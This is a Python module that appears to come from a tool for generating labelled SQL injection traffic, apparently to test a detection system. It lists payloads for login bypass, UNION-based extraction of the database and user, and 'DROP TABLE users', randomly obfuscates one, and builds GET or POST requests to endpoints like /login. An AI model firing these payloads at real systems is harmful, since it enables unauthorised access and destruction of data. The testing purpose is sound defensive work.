import random
from typing import Dict, Tuple
from .base import BaseAttack
from ..utils.obfuscator import Obfuscator

class SQLIAttack(BaseAttack):
    PAYLOADS = [
        "' OR '1'='1",
        "' OR 1=1 --",
        "admin' --",
        "' UNION SELECT 1, database(), user() --",
        "1; DROP TABLE users",
        "' OR 'x'='x",
        "admin' #",
        "' OR 1=1 LIMIT 1 --",
        "') OR ('1'='1",
        "admin' AND 1=1 --"
    ]

    ENDPOINTS = [
        "/login",
        "/search",
        "/product",
        "/api/users"
    ]

    def generate(self, base_url: str) -> Tuple[Dict, Dict]:
        """
        Generates an SQL Injection attack configuration.
        Returns: (request_kwargs, answer_key_metadata)
        """
        payload = Obfuscator.obfuscate(random.choice(self.PAYLOADS), self.obfuscation_level)
        endpoint = random.choice(self.ENDPOINTS)
        url = f"{base_url}{endpoint}"
        
        method = "GET"
        data = None
        params = None
        
        # Randomly choose between GET (query param) and POST (body)
        if random.choice([True, False]):
            method = "POST"
            data = {"q": payload}
        else:
            params = {"id": payload}

        request_kwargs = {
            "method": method,
            "url": url,
            "data": data,
            "params": params
        }
        
        metadata = {
            "type": "SQLI",
            "endpoint": endpoint,
            "payload": payload,
            "method": method
        }
        
        return request_kwargs, metadata
